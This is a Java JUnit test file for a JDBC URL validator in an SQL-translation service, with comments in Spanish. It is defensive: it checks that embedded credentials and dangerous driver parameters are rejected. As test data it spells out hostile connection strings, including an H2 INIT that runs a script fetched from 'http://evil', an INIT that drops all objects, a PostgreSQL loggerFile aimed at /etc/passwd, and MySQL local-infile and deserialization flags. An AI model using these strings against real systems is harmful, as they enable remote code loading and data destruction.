package com.sqlai.sql_ia_translator.service;

import com.sqlai.sql_ia_translator.exception.DatabaseConnectionException;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.*;

class JdbcUrlValidatorTest {

    private final JdbcUrlValidator validator = new JdbcUrlValidator();

    // ── URLs válidas ──

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:mysql://localhost:3306/mydb",
            "jdbc:mysql://localhost:3306/mydb?useSSL=false&serverTimezone=UTC",
            "jdbc:postgresql://localhost:5432/mydb",
            "jdbc:postgresql://host:5432/db?sslmode=require",
            "jdbc:h2:mem:testdb",
            "jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1",
            "jdbc:h2:file:./data/test"
    })
    void acceptsValidUrls(String url) {
        assertDoesNotThrow(() -> validator.validate(url));
    }

    // ── Prefijo no permitido ──

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:oracle:thin:@localhost:1521:xe",
            "jdbc:sqlserver://host:1433;databaseName=db",
            "jdbc:sqlite:test.db",
            "http://localhost:8080",
            "not-a-url"
    })
    void rejectsUnsupportedPrefix(String url) {
        var ex = assertThrows(DatabaseConnectionException.class,
                () -> validator.validate(url));
        assertTrue(ex.getMessage().contains("no soportado"));
    }

    // ── URL vacía o null ──

    @ParameterizedTest
    @NullAndEmptySource
    @ValueSource(strings = {"   ", "\t"})
    void rejectsBlankOrNullUrl(String url) {
        assertThrows(DatabaseConnectionException.class,
                () -> validator.validate(url));
    }

    // ── Credenciales embebidas ──

    @Test
    void rejectsEmbeddedCredentials() {
        var ex = assertThrows(DatabaseConnectionException.class,
                () -> validator.validate("jdbc:mysql://admin:s3cret@host:3306/db"));
        assertTrue(ex.getMessage().contains("credenciales embebidas"));
    }

    @Test
    void rejectsPostgresEmbeddedCredentials() {
        assertThrows(DatabaseConnectionException.class,
                () -> validator.validate("jdbc:postgresql://user:pass@host:5432/db"));
    }

    // ── Parámetros peligrosos MySQL ──

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:mysql://host/db?allowLoadLocalInfile=true",
            "jdbc:mysql://host/db?allowUrlInLocalInfile=true",
            "jdbc:mysql://host/db?autoDeserialize=true",
            "jdbc:mysql://host/db?allowMultiQueries=true",
            "jdbc:mysql://host/db?useSSL=false&allowLoadLocalInfile=true",
            "jdbc:mysql://host/db?socketFactory=com.evil.Factory"
    })
    void rejectsDangerousMysqlParams(String url) {
        var ex = assertThrows(DatabaseConnectionException.class,
                () -> validator.validate(url));
        assertTrue(ex.getMessage().contains("no permitido"));
    }

    // ── Parámetros peligrosos PostgreSQL ──

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://host/db?socketFactory=evil",
            "jdbc:postgresql://host/db?sslfactory=evil.Factory",
            "jdbc:postgresql://host/db?loggerFile=/etc/passwd"
    })
    void rejectsDangerousPostgresParams(String url) {
        assertThrows(DatabaseConnectionException.class,
                () -> validator.validate(url));
    }

    // ── Parámetros peligrosos H2 ──

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/script.sql'",
            "jdbc:h2:mem:test;init=DROP ALL OBJECTS"
    })
    void rejectsDangerousH2Params(String url) {
        assertThrows(DatabaseConnectionException.class,
                () -> validator.validate(url));
    }

    // ── Case-insensitive ──

    @Test
    void paramCheckIsCaseInsensitive() {
        assertThrows(DatabaseConnectionException.class,
                () -> validator.validate("jdbc:mysql://host/db?ALLOWLOADLOCALINFILE=true"));
    }

    // ── Parámetros seguros no se bloquean ──

    @Test
    void allowsSafeParams() {
        assertDoesNotThrow(() -> validator.validate(
                "jdbc:mysql://localhost/db?useSSL=true&serverTimezone=UTC&characterEncoding=utf8"));
    }
}
